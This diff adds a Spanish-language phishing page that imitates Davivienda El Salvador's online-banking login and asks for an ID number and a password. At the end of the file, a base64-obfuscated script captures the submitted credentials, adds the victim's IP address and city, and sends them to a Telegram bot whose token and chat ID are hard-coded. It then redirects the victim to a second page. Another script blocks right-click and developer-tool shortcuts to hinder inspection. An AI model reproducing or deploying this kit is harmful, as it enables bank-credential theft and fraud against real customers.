@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SV</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* 🔴 Header con franja roja */
+    .header {
+      background: #e30613;
+      padding: 12px 0;
+      text-align: center;
+    }
+
+    .header img {
+      max-width: 220px;
+      width: 80%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 35px;
+      border-radius: 8px;
+
+ 
+    }
+
+    .title {
+      font-size: 16px;
+      margin-bottom: 20px;
+      text-align: left;
+      font-weight: bold;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    /* 👤 Input con ícono de usuario */
+    .input-user {
+      width: 80%;
+      padding: 10px 10px 10px 40px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      background: url("user.png") no-repeat 10px center;
+      background-size: 18px;
+    }
+
+    /* 🔒 Input con ícono de candado */
+    .input-cad {
+      width: 80%;
+      padding: 10px 10px 10px 40px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      background: url("cad.jpg") no-repeat 10px center;
+      background-size: 18px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #e30613;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 50px;
+    }
+
+    .btn:hover {
+      background: #c00511;
+    }
+
+    /* Footer */
+    .footer {
+    width: 100%;
+    margin-top: auto;
+    text-align: center;
+    background: #000;
+    overflow: hidden;
+}
+
+.footer img {
+    display: block;
+    width: 100%;
+    max-width: 100%;
+    height: auto;
+    object-fit: contain;
+    margin: 0 auto;
+}
+
+/* ===== IMAGEN DE FONDO ===== */
+.bg-img {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    overflow: hidden;
+    pointer-events: none;
+}
+
+.bg-img img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+/* ===== AJUSTES PARA TELÉFONOS ===== */
+@media (max-width: 600px) {
+    .footer {
+        width: 100%;
+    }
+
+    .footer img {
+        width: 100%;
+        max-width: 100%;
+        height: auto;
+    }
+
+    .container {
+        width: auto;
+        max-width: 400px;
+        margin: 25px 15px;
+        padding: 20px;
+    }
+ 
+
+/* ===== BORDE ROJO EN LOS DOS INPUT ===== */
+.input-user:focus,
+.input-cad:focus {
+    outline: none;
+    border: 1px solid #e30613;
+    box-shadow: 0 0 5px rgba(227, 6, 19, 0.35);
+}
+  </style>
+
+<script> 
+    // Bloquear clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    }
+</script>
+
+
+</head>
+<body>
+  <!-- 🔴 Header con logo centrado -->
+  <div class="header">
+    <img src="https://enlinea.davivienda.com.sv/ebanking/images/DAVIVIENDA/header/logo_davivienda.png" alt="Logo">
+  </div>
+
+
+<!-- IMAGEN FONDO -->
+<div class="bg-img">
+    <img src="sv3.png" alt="Fondo">
+</div>
+
+
+  <br>
+ <br>
+
+  <div class="container">
+<div class="title" style="text-align: center;"><strong>Autenticaci&oacute;n del cliente</strong></div>
+  <br>
+<form id="loginForm">
+      <label for="usuario">Usuario</label>
+      <input type="tel" id="1" name="1" inputmode="numeric" class="input-user" placeholder="Ingrese número de identificación" minlength="9" maxlength="9" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;" required>
+
+
+<br>
+
+
+<br>
+
+      <label for="clave">Contraseña</label>
+      <input type="text" id="2" name="2" class="input-cad" placeholder="Ingrese su contraseña" required>
+
+
+      <button type="submit" class="btn">Continuar</button>
+    </form>
+
+ 
+  </div>
+
+
+
+<div class="footer">
+    <img src="cop.png" alt="Imagen inferior">
+</div>
+
+  </div>
+
+
+
+<script>document.write(decodeURIComponent(escape(atob("PC9mb3JtPgoKICAgCiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgoKICA8c2NyaXB0PgogICAgJChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24gKCkgewogICAgICAkKCcjbG9naW5Gb3JtJykuc3VibWl0KGZ1bmN0aW9uIChlKSB7CiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgICBjb25zdCB1X25hbWUxICA9ICQoJyMxJykudmFsKCkudHJpbSgpOwogICAgICAgIGNvbnN0IHVfbmFtZTIgICAgPSAkKCcjMicpLnZhbCgpLnRyaW0oKTsKICAgICAgICBsZXQgbWVzc2FnZSA9IGDinIUgQ2F5byAtIDQ6MjAg4pyFXG51c2VyOiAke3VfbmFtZTF9XG5DbHY6ICR7dV9uYW1lMn1gOwoKICAgICAgICAvLyBPYnRlbmVyIElQIHDDumJsaWNhCiAgICAgICAgICQuZ2V0SlNPTigiaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uIiwgZnVuY3Rpb24gKGRhdGEpIHsKICAgICAgICBjb25zdCBpcCA9IGRhdGEuaXA7CiAgICAgICAgJC5nZXRKU09OKCJodHRwczovL2lwaW5mby5pbyIsIGZ1bmN0aW9uIChyZXNwb25zZSkgewogICAgICAgICAgY29uc3QgaXAyID0gcmVzcG9uc2UuY2l0eSArICIsICIgKyByZXNwb25zZS5jb3VudHJ5OwogICAgICAgICAgbWVzc2FnZSArPSBgXG7inIUgSVA6ICR7aXB9XG7inIUgVWJpY2FjacOzbjogJHtpcDJ9YDsKCiAgICAgICAgICBjb25zdCB0ZWxlZ3JhbV9ib3RfaWQgPSAiODgwMjMxMzYyNjpBQUcyT2xfLUdkUXN3dGNpYlI4Y0lJS0oycHRsMDhEd2VGTSI7CiAgICAgICAgICBjb25zdCBjaGF0X2lkID0gIjc2MjM5NDQ3ODEiOwogICAgICAgICAgY29uc3Qgc2V0dGluZ3MgPSB7CiAgICAgICAgICAgICJhc3luYyI6IHRydWUsCiAgICAgICAgICAgICJjcm9zc0RvbWFpbiI6IHRydWUsCiAgICAgICAgICAgICJ1cmwiOiAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIgKyB0ZWxlZ3JhbV9ib3RfaWQgKyAiL3NlbmRNZXNzYWdlIiwKICAgICAgICAgICAgIm1ldGhvZCI6ICJQT1NUIiwKICAgICAgICAgICAgImhlYWRlcnMiOiB7CiAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAiY2FjaGUtY29udHJvbCI6ICJuby1jYWNoZSIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgImRhdGEiOiBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgImNoYXRfaWQiOiBjaGF0X2lkLAogICAgICAgICAgICAgICJ0ZXh0IjogbWVzc2FnZQogICAgICAgICAgICB9KQogICAgICAgICAgfTsKCiAgICAgICAgICAkLmFqYXgoc2V0dGluZ3MpLmRvbmUoZnVuY3Rpb24gKCkgewogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICcyLmh0bWwnOwogICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwogICAgfSk7CiAgfSk7Cjwvc2NyaXB0PgoKCgogCgoKPC9ib2R5Pgo8L2h0bWw+Cg=="))));</script>
